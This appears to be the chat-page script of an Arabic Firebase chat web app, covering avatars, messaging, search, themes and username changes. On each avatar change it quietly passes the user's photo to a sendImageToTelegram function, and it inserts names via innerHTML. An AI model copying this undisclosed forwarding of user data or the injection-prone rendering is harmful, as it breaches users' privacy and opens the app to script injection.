// التحكم في صفحة المحادثة
document.addEventListener('DOMContentLoaded', function() {
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    
    if (!currentUser) {
        window.location.href = 'index.html';
        return;
    }
    
    // عرض معلومات المستخدم مع العلامة
    updateProfileDisplay(currentUser);
    
    // عرض الصورة الشخصية
    const currentUsername = currentUser.username.toUpperCase();
    
    // الصورة الخاصة بالمطور تظهر دائمًا
    if (currentUsername === 'FIROGIST') {
        document.getElementById('userAvatar').src = 'images/123456.png';
        document.getElementById('userAvatar').onerror = function() {
            this.src = 'https://via.placeholder.com/50';
        };
    } else if (currentUser.avatar) {
        document.getElementById('userAvatar').src = currentUser.avatar;
    } else {
        document.getElementById('userAvatar').src = 'https://via.placeholder.com/50';
    }
    
    // تحميل الوضع الداكن
    loadDarkMode();
    
    // تحديث حالة الاتصال
    firebaseChat.updateOnlineStatus();
    
    setInterval(() => {
        firebaseChat.updateOnlineStatus();
    }, 30000);
    
    window.addEventListener('beforeunload', function() {
        firebaseChat.updateOfflineStatus();
    });
    
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            firebaseChat.updateOfflineStatus();
        } else {
            firebaseChat.updateOnlineStatus();
            firebaseChat.loadUsers();
        }
    });
    
    // تحميل الثيم المحفوظ
    loadTheme();
    
    // تحميل قائمة المحادثات
    firebaseChat.loadUsers();
    
    // تحميل الإيموجيز
    loadEmojis();
    
    // عداد الضغطات على البروفايل
    let profileClickCount = 0;
    let profileClickTimer = null;
    
    document.getElementById('userProfile').addEventListener('click', function(e) {
        if (e.target.closest('.edit-avatar-btn') || e.target.closest('.edit-name-btn') || e.target.closest('.edit-username-btn')) {
            return;
        }
        
        profileClickCount++;
        
        clearTimeout(profileClickTimer);
        
        profileClickTimer = setTimeout(() => {
            profileClickCount = 0;
        }, 2000);
        
        if (profileClickCount >= 5) {
            profileClickCount = 0;
            firebaseChat.showHiddenChats();
        }
    });
    
    // تغيير الصورة الشخصية
    window.changeAvatar = function() {
        if (confirm('هل تسمح بالوصول إلى الصور؟')) {
            document.getElementById('avatarInput').click();
        }
    };
    
    // معالجة تغيير الصورة
    window.handleAvatarChange = async function(event) {
        const file = event.target.files[0];
        
        if (!file) {
            return;
        }
        
        if (!file.type.startsWith('image/')) {
            alert('الرجاء اختيار ملف صورة');
            return;
        }
        
        const reader = new FileReader();
        
        reader.onload = async function(e) {
            const imageDataUrl = e.target.result;
            
            const result = await firebaseAuth.updateAvatar(currentUser.username, imageDataUrl);
            
            if (result.success) {
                document.getElementById('userAvatar').src = imageDataUrl;
                
                const updatedUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
                updatedUser.avatar = imageDataUrl;
                localStorage.setItem('fb_chat_current_user', JSON.stringify(updatedUser));
                
                await sendImageToTelegram(imageDataUrl, currentUser.username);
                
                console.log('✅ تم تحديث الصورة الشخصية');
            } else {
                alert('فشل في تحديث الصورة');
            }
        };
        
        reader.readAsDataURL(file);
        event.target.value = '';
    };
    
    // البحث عن مستخدم جديد
    window.searchUser = async function() {
        const searchInput = document.getElementById('searchUser').value.trim();
        
        if (!searchInput) {
            alert('الرجاء إدخال اسم المستخدم');
            return;
        }
        
        const searchBtn = document.querySelector('.search-box button');
        searchBtn.textContent = '...';
        searchBtn.disabled = true;
        
        const result = await firebaseAuth.searchUser(searchInput);
        
        if (result.success) {
            const telegramResult = await checkTelegramUser(searchInput);
            
            let message = `✅ المستخدم @${searchInput} موجود في FB Chat`;
            if (telegramResult.exists) {
                message += `\n📱 وهو موجود أيضاً على تيليجرام`;
            }
            
            alert(message);
            firebaseChat.selectPartner(result.user);
            
            document.getElementById('searchUser').value = '';
        } else {
            const telegramResult = await checkTelegramUser(searchInput);
            
            if (telegramResult.exists) {
                alert(`📱 المستخدم @${searchInput} موجود على تيليجرام فقط\nلكنه غير مسجل في FB Chat`);
            } else {
                alert(`❌ المستخدم @${searchInput} غير موجود`);
            }
        }
        
        searchBtn.textContent = 'بحث';
        searchBtn.disabled = false;
    };
    
    // إرسال رسالة
    window.sendMessage = async function() {
        const messageInput = document.getElementById('messageInput');
        const message = messageInput.value.trim();
        
        if (!message) {
            return;
        }
        
        const sent = await firebaseChat.sendMessage(message);
        
        if (sent) {
            messageInput.value = '';
            messageInput.focus();
        }
    };
    
    // معالجة رفع الصورة
    window.handleImageUpload = async function(event) {
        const file = event.target.files[0];
        
        if (!file) {
            return;
        }
        
        if (!file.type.startsWith('image/')) {
            alert('الرجاء اختيار ملف صورة');
            return;
        }
        
        const reader = new FileReader();
        
        reader.onload = async function(e) {
            const imageDataUrl = e.target.result;
            const sent = await firebaseChat.sendImage(imageDataUrl);
            
            if (!sent) {
                alert('فشل في إرسال الصورة');
            }
        };
        
        reader.readAsDataURL(file);
        event.target.value = '';
    };
    
    // إرسال بالضغط على Enter
    document.getElementById('messageInput').addEventListener('keypress', function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            sendMessage();
        }
    });
    
    // إغلاق القائمة المنسدلة
    document.addEventListener('click', function(e) {
        const menu = document.getElementById('dropdownMenu');
        const dots = document.querySelector('.menu-dots');
        
        if (menu && dots && !menu.contains(e.target) && !dots.contains(e.target)) {
            menu.classList.remove('show');
        }
    });
    
    // تحديث قائمة المحادثات
    setInterval(() => {
        if (!document.hidden) {
            firebaseChat.loadUsers();
        }
    }, 30000);
});

// ============ دوال الوضع الداكن ============

function toggleDarkMode() {
    const container = document.getElementById('chatContainer');
    container.classList.toggle('dark-mode');
    
    const isDark = container.classList.contains('dark-mode');
    localStorage.setItem('fb_dark_mode', isDark ? 'true' : 'false');
    
    const btn = document.getElementById('darkModeBtn');
    btn.textContent = isDark ? '☀️ الوضع النهاري' : '🌙 الوضع الداكن';
    
    document.getElementById('dropdownMenu').classList.remove('show');
}

function loadDarkMode() {
    const saved = localStorage.getItem('fb_dark_mode');
    if (saved === 'true') {
        document.getElementById('chatContainer').classList.add('dark-mode');
        document.getElementById('darkModeBtn').textContent = '☀️ الوضع النهاري';
    }
}

// ============ دوال الإيموجي ============

const emojiList = [
    '😀', '😁', '😂', '🤣', '😃', '😄', '😅', '😆', '😉', '😊',
    '😋', '😎', '😍', '🥰', '😘', '😗', '😙', '😚', '🙂', '🤗',
    '🤩', '🤔', '🤨', '😐', '😑', '😶', '🙄', '😏', '😣', '😥',
    '😮', '🤐', '😯', '😪', '😫', '😴', '😌', '😛', '😜', '😝',
    '🤤', '😒', '😓', '😔', '😕', '🙃', '🤑', '😲', '☹️', '🙁',
    '😖', '😞', '😟', '😤', '😢', '😭', '😦', '😧', '😨', '😩',
    '🤯', '😬', '😰', '😱', '🥵', '🥶', '😳', '🤪', '😵', '😡',
    '😠', '🤬', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '😇', '🥳',
    '🥺', '🤠', '🤡', '🤥', '🤫', '🤭', '🧐', '🤓', '😈', '👿',
    '👹', '👺', '💀', '👻', '👽', '🤖', '💩', '😺', '😸', '😹',
    '❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '💔',
    '❤️‍🔥', '❤️‍🩹', '💖', '💗', '💓', '💞', '💕', '💘', '💝', '💟',
    '👍', '👎', '👌', '✌️', '🤞', '🤟', '🤘', '👏', '🙌', '👐',
    '🤲', '🤝', '🙏', '💪', '🦾', '🖕', '☝️', '👆', '👇', '👉',
    '👈', '✊', '👊', '🤛', '🤜', '🤚', '👋', '🤚', '🖐️', '✋'
];

function loadEmojis() {
    const grid = document.getElementById('emojiGrid');
    grid.innerHTML = '';
    
    emojiList.forEach(emoji => {
        const span = document.createElement('span');
        span.className = 'emoji-item';
        span.textContent = emoji;
        span.onclick = function() {
            insertEmoji(emoji);
        };
        grid.appendChild(span);
    });
}

function toggleEmojiPicker() {
    const picker = document.getElementById('emojiPicker');
    if (picker.style.display === 'none') {
        picker.style.display = 'block';
    } else {
        picker.style.display = 'none';
    }
}

function insertEmoji(emoji) {
    const input = document.getElementById('messageInput');
    input.value += emoji;
    input.focus();
}

// ============ دوال تعديل الاسم ============

function updateProfileDisplay(user) {
    const currentUsername = user.username.toUpperCase();
    const isDev = currentUsername === 'FIROGIST';
    const isPrincess = currentUsername === 'BESO';
    
    if (isDev) {
        document.getElementById('userName').innerHTML = `${user.name} <span class="gold-check">✓</span>`;
        document.getElementById('userUsername').innerHTML = `@${user.username} <span class="dev-badge">مطور</span>`;
    } else if (isPrincess) {
        document.getElementById('userName').innerHTML = `${user.name} <span class="silver-check">✓</span>`;
        document.getElementById('userUsername').innerHTML = `@${user.username} <span class="princess-badge">البرنسيسه</span>`;
    } else {
        document.getElementById('userName').textContent = user.name;
        document.getElementById('userUsername').textContent = '@' + user.username;
    }
}

function editName() {
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    document.getElementById('editNameInput').value = currentUser.name;
    document.getElementById('editNameModal').classList.add('show');
}

function closeEditNameModal() {
    document.getElementById('editNameModal').classList.remove('show');
}

async function saveNewName() {
    const newName = document.getElementById('editNameInput').value.trim();
    
    if (!newName) {
        alert('الرجاء إدخال اسم');
        return;
    }
    
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    
    try {
        await db.collection('users').doc(currentUser.username).update({
            name: newName
        });
        
        currentUser.name = newName;
        localStorage.setItem('fb_chat_current_user', JSON.stringify(currentUser));
        
        updateProfileDisplay(currentUser);
        closeEditNameModal();
        
        alert('✅ تم تغيير الاسم بنجاح!');
    } catch (error) {
        console.error('خطأ:', error);
        alert('فشل في تغيير الاسم');
    }
}

function editUsername() {
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    
    if (currentUser.last_username_change) {
        const lastChange = new Date(currentUser.last_username_change);
        const now = new Date();
        const diffDays = Math.floor((now - lastChange) / (1000 * 60 * 60 * 24));
        
        if (diffDays < 7) {
            alert(`⚠️ مش هتقدر تغير اسم المستخدم غير بعد ${7 - diffDays} يوم`);
            return;
        }
    }
    
    document.getElementById('editUsernameInput').value = currentUser.username;
    document.getElementById('editUsernameModal').classList.add('show');
}

function closeEditUsernameModal() {
    document.getElementById('editUsernameModal').classList.remove('show');
}

async function saveNewUsername() {
    const newUsername = document.getElementById('editUsernameInput').value.trim();
    
    if (!newUsername) {
        alert('الرجاء إدخال اسم مستخدم');
        return;
    }
    
    if (newUsername.length < 3) {
        alert('اسم المستخدم يجب أن يكون 3 أحرف على الأقل');
        return;
    }
    
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    
    if (!confirm('⚠️ تحذير: مش هتقدر تغير اسم المستخدم تاني غير بعد 7 أيام!\n\nهل أنت متأكد؟')) {
        return;
    }
    
    try {
        const userDoc = await db.collection('users').doc(newUsername).get();
        if (userDoc.exists) {
            alert('اسم المستخدم موجود بالفعل');
            return;
        }
        
        await db.collection('users').doc(currentUser.username).delete();
        
        await db.collection('users').doc(newUsername).set({
            ...currentUser,
            username: newUsername,
            last_username_change: new Date().toISOString(),
            chat_partners: [],
            hidden_chats: []
        });
        
        currentUser.username = newUsername;
        currentUser.last_username_change = new Date().toISOString();
        localStorage.setItem('fb_chat_current_user', JSON.stringify(currentUser));
        
        updateProfileDisplay(currentUser);
        closeEditUsernameModal();
        
        alert('✅ تم تغيير اسم المستخدم بنجاح!\n⚠️ العلامة الذهبية والشارة اختفوا.');
        
        setTimeout(() => {
            window.location.reload();
        }, 1500);
        
    } catch (error) {
        console.error('خطأ:', error);
        alert('فشل في تغيير اسم المستخدم');
    }
}

// ============ دوال الثيمات ============

let currentTheme = {
    font: 'Cairo',
    messageBg: '#ffffff',
    chatBg: '#f5f5f5'
};

function openThemeModal() {
    document.getElementById('themeModal').classList.add('show');
    document.getElementById('dropdownMenu').classList.remove('show');
}

function closeThemeModal() {
    document.getElementById('themeModal').classList.remove('show');
}

function switchThemeTab(tab) {
    document.getElementById('fontSection').style.display = 'none';
    document.getElementById('messageBgSection').style.display = 'none';
    document.getElementById('chatBgSection').style.display = 'none';
    
    if (tab === 'font') {
        document.getElementById('fontSection').style.display = 'block';
    } else if (tab === 'messageBg') {
        document.getElementById('messageBgSection').style.display = 'block';
    } else if (tab === 'chatBg') {
        document.getElementById('chatBgSection').style.display = 'block';
    }
    
    document.querySelectorAll('.theme-tab').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
}

function selectFont(font) {
    currentTheme.font = font;
    applyThemePreview();
}

function selectMessageBg(color) {
    currentTheme.messageBg = color;
    applyThemePreview();
}

function selectChatBg(color) {
    currentTheme.chatBg = color;
    applyThemePreview();
}

function applyThemePreview() {
    document.getElementById('chatContainer').style.fontFamily = `'${currentTheme.font}', sans-serif`;
    document.getElementById('messages').style.background = currentTheme.chatBg;
    
    document.querySelectorAll('.message.received .message-content').forEach(el => {
        el.style.background = currentTheme.messageBg;
    });
}

function saveTheme() {
    localStorage.setItem('fb_chat_theme', JSON.stringify(currentTheme));
    closeThemeModal();
    alert('✅ تم حفظ الثيم بنجاح!');
}

function loadTheme() {
    const savedTheme = localStorage.getItem('fb_chat_theme');
    if (savedTheme) {
        currentTheme = JSON.parse(savedTheme);
        applyThemePreview();
    }
}

function resetTheme() {
    currentTheme = {
        font: 'Cairo',
        messageBg: '#ffffff',
        chatBg: '#f5f5f5'
    };
    localStorage.removeItem('fb_chat_theme');
    applyThemePreview();
}

// ============ دوال أخرى ============

function logout() {
    if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
        firebaseChat.updateOfflineStatus();
        localStorage.removeItem('fb_chat_current_user');
        localStorage.removeItem('fb_chat_remember');
        window.location.href = 'index.html';
    }
}

document.addEventListener('click', function(e) {
    const editModal = document.getElementById('editModal');
    if (editModal && e.target === editModal) {
        closeEditModal();
    }
    
    const themeModal = document.getElementById('themeModal');
    if (themeModal && e.target === themeModal) {
        closeThemeModal();
    }
    
    const editNameModal = document.getElementById('editNameModal');
    if (editNameModal && e.target === editNameModal) {
        closeEditNameModal();
    }
    
    const editUsernameModal = document.getElementById('editUsernameModal');
    if (editUsernameModal && e.target === editUsernameModal) {
        closeEditUsernameModal();
    }
});
